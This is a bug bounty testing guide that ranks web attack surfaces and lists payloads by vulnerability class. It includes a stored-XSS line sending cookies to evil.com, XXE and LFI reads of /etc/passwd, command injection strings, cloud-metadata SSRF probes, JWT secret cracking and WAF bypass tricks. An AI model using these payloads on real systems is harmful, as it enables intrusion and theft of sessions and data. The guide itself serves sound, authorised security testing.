# Heat Mapping & Vulnerability Classes - Bug Bounty Hunter Guide

## Heat Map: Where to Focus First

### HIGH HEAT 🔥🔥🔥
- File Upload endpoints
- New features / Recent redesigns
- Admin functions
- API endpoints (especially undocumented)
- Payment / Subscription functions
- OAuth / SSO integrations

### MEDIUM HEAT 🔥🔥
- Search functionality
- User profile / account settings
- Export functions (PDF, CSV, XML)
- Password reset flows
- Email notification systems

### LOW HEAT 🔥
- Static marketing pages
- Blog / public content
- About/Contact pages

---

## Upload Functions - Full Attack Surface

### Image Uploads
- **XSS**: SVG with `<script>` tag → `<svg onload="alert(1)">`
- **Shell**: bypass extension check → `shell.php.jpg`, `shell.pHp`
- **SSRF**: if processed server-side
- Check: Content-Type bypass, double extension, null bytes

### Document Uploads (DOCX, PDF, XLSX)
- **XXE**: Office docs are ZIP+XML → inject XXE payload in XML
- **SSRF**: External entity → server makes requests
- **XSS**: PDF with embedded JavaScript
- Tools: `docx2txt`, custom XXE payloads

### Upload Metadata
- EXIF data preserved? → info disclosure
- Filename reflected? → XSS, Path traversal
- Where stored? → S3 bucket permissions check

### S3 Bucket Checks
```bash
aws s3 ls s3://target-uploads --no-sign-request
aws s3 cp s3://target-uploads/file.txt . --no-sign-request
```

---

## Content Type Triggers

| Content Type | What to Test |
|-------------|-------------|
| `multipart/form-data` | Shell upload, injection, XSS |
| `application/xml` or `text/xml` | XXE injection |
| `application/json` | API vulns, mass assignment |
| `application/x-www-form-urlencoded` | SQLi, XSS, CSRF |
| `text/html` in API response | XSS, HTML injection |

---

## API Testing Deep Dive

### Finding Hidden Endpoints
- JS files: `grep -r "api/" *.js`
- Burp → Target → JS Analysis
- Wordlists: `/api/v1/users`, `/api/admin`, `/internal/`
- HTTP methods: try GET, POST, PUT, DELETE, PATCH, OPTIONS

### Common API Vulnerabilities
**BOLA/IDOR** (Most common!)
```
GET /api/v1/users/1234/data  → change to /1235
GET /api/orders/abc123       → enumerate order IDs
```

**Mass Assignment**
```json
// Normal request
{"name": "John"}
// Attack: add extra fields
{"name": "John", "role": "admin", "isAdmin": true}
```

**Lack of Authentication**
- Remove auth token → does it still work?
- Change `Authorization: Bearer TOKEN` to empty
- Try `/api/v1/` vs `/api/v2/` → older versions less secured

**GraphQL Specific**
```graphql
# Introspection (find all queries/mutations)
{ __schema { types { name fields { name } } } }
# IDOR via GraphQL
{ user(id: "OTHER_USER_ID") { email, password } }
```

---

## Account Section Vulnerabilities

### Profile Fields → Stored XSS
```
First Name: <script>fetch('https://evil.com?c='+document.cookie)</script>
Bio: <img src=x onerror=alert(document.domain)>
Website: javascript:alert(1)
```

### Custom Fields / App Fields → SSTI
```
# Jinja2/Twig
{{7*7}} → 49 = vulnerable
{{config.items()}} → config disclosure
# FreeMarker
${7*7}
# Velocity
#set($x=7*7)${x}
```

### Integrations → SSRF
- Webhook URL: `http://169.254.169.254/latest/meta-data/`
- Import from URL: try internal IPs
- OAuth callback: open redirect → token theft

---

## Vulnerability Checklists

### XSS
- [ ] Reflected: input in URL → reflected in response
- [ ] Stored: input saved → displayed to other users
- [ ] DOM: JS reads from URL → writes to DOM
- [ ] Blind: input stored → rendered in admin panel
- Payloads: `<script>alert(1)</script>`, `"><img src=x onerror=alert(1)>`, `javascript:alert(1)`

### SQL Injection
- [ ] Error-based: `'`, `"`, `1'--`
- [ ] Boolean: `1 AND 1=1`, `1 AND 1=2`
- [ ] Time-based: `1; WAITFOR DELAY '0:0:5'--`
- Tool: `sqlmap -u "https://target.com/page?id=1" --dbs`

### IDOR / BOLA
- [ ] Change numeric IDs: `?id=123` → `?id=124`
- [ ] Change UUIDs in body/headers
- [ ] Horizontal: same role, diff user
- [ ] Vertical: lower role accessing higher role data

### SSRF
- [ ] Any URL parameter: `?url=`, `?webhook=`, `?callback=`
- [ ] PDF generators, image fetchers
- Payloads: `http://127.0.0.1/`, `http://169.254.169.254/`, `http://[::1]/`

### XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### JWT Attacks
- [ ] `alg: none` bypass
- [ ] RS256 → HS256 confusion
- [ ] Weak secret brute force: `hashcat -a 0 -m 16500 token.txt wordlist.txt`
- Tool: jwt_tool, jwt.io

### CSRF
- [ ] Remove CSRF token → still works?
- [ ] Change token to random value
- [ ] Change POST to GET
- [ ] SameSite cookie attribute missing

### Open Redirect
- [ ] `?redirect=https://evil.com`
- [ ] `?next=//evil.com`
- [ ] `?url=javascript:alert(1)`

### Host Header Injection
- `Host: evil.com` → password reset link goes to evil.com
- `Host: target.com.evil.com`
- `X-Forwarded-Host: evil.com`

### Race Conditions
- Coupon codes: apply same code twice simultaneously
- Transfer: send same amount twice
- Tool: Burp Suite Turbo Intruder

### Subdomain Takeover
- CNAME points to unclaimed service (GitHub Pages, Heroku, etc.)
- `dig CNAME sub.target.com` → points to `target.github.io` (not claimed)
- Tools: `subjack`, `nuclei -t takeovers/`

### CORS Misconfiguration
```
Origin: https://evil.com
→ Response: Access-Control-Allow-Origin: https://evil.com
→ Response: Access-Control-Allow-Credentials: true
= CRITICAL! Can steal authenticated data
```

### LFI
- `?file=../../../../etc/passwd`
- `?page=php://filter/convert.base64-encode/resource=index.php`
- Wrappers: `php://`, `data://`, `zip://`

### Command Injection
- `;id`, `|id`, `` `id` ``, `$(id)`
- In: ping tools, DNS lookup, report generators
- Blind: `; sleep 5`, time-based detection

---

## WAF Bypass Techniques

### Cloudflare / Imperva Bypass
- Case variation: `<ScRiPt>`, `SeLeCt`
- Encoding: URL encode, double encode, HTML entities
- Comments: `SE/**/LECT`, `<scr<!---->ipt>`
- Alternate syntax: `||`, `&&` instead of `OR`, `AND`
- Chunked encoding
- Use collaborator for blind vulns
